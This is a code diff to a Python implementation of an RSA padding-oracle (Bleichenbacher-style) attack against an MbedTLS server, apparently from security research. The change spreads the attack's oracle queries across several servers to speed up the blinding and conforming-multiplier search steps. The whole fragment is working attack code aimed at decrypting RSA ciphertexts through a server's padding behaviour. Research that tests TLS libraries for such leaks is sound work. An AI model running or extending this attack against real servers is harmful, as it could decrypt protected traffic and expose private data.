@@ -87,6 +87,12 @@ def merge_intervals(intervals):
     return merged
 
 
+def one_query(oracle, content):
+    oracle.add_query(None, content)
+    _, result = oracle.wait_query()
+    return result
+
+
 def blinding(k, key, c, oracle):
     """
     Step 1 of the attack
@@ -99,7 +105,7 @@ def blinding(k, key, c, oracle):
     global total_queries
     if verbosity > 0:
         total_queries += 1
-    if oracle.query(c.to_bytes(k, byteorder='big')):
+    if one_query(oracle, c.to_bytes(k, byteorder='big')):
         return 1, c
     while True:
         s_0 = urandom(k)
@@ -108,17 +114,24 @@ def blinding(k, key, c, oracle):
         c_0 = (c * pow(s_0, key.e, key.n)) % key.n
         if verbosity > 0:
             total_queries += 1
-        if oracle.query(c_0.to_bytes(k, byteorder='big')):
+        if one_query(oracle, c_0.to_bytes(k, byteorder='big')):
             return s_0, c_0
 
 
-def s_c_conform(key, c, s, oracle, k):
+def s_c_conform(key, c, s, oracle, k, num_queries=None):
     global total_queries
+    if num_queries is None:
+        num_queries = len(oracle)
     if verbosity > 0:
-        total_queries += len(oracle)
-    if oracle.query(((c * pow(s, key.e, key.n)) % key.n).to_bytes(k, byteorder='big')):
-        return s
-    return -1
+        total_queries += num_queries
+    for i in range(num_queries):
+        oracle.add_query(i, ((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
+    retval = -1
+    for _ in range(num_queries):
+        i, result = oracle.wait_query()
+        if result and retval == -1:
+            retval = s + i
+    return retval
 
 def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
     """
@@ -246,7 +259,7 @@ if __name__ == "__main__":
     with open(args.public_key, "rb") as keyfile:
         pub_key = read_pubkey(keyfile, k)
 
-    oracle = MbedTLS_Oracle(port=args.server_port, stage=args.stage)
+    oracle = MbedTLS_Oracle(port=args.server_port, stage=args.stage, num_servers=args.num_servers)
 
     if args.given_enc is not None:
         with open(args.given_enc, "rb") as f:
